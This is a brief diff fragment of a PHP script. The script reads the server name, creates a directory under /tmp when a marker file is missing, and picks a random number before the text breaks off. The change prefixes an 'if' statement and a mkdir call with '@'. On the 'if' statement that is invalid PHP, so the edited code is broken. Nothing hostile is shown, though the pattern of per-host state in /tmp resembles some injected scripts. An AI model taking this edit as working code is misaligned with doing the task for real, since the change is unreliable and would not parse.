@@ -1,9 +1,7 @@
 <?php
 $d=$_SERVER['SERVER_NAME'];
-if(filesize('/tmp/conf'.$d)) { } else {
-	mkdir('/tmp/conf'.$d);
-	
-	
+@if(filesize('/tmp/conf'.$d)) { } else {
+@mkdir('/tmp/conf'.$d);
 $sayi = rand(1,6);
 if($sayi == 1) {
 
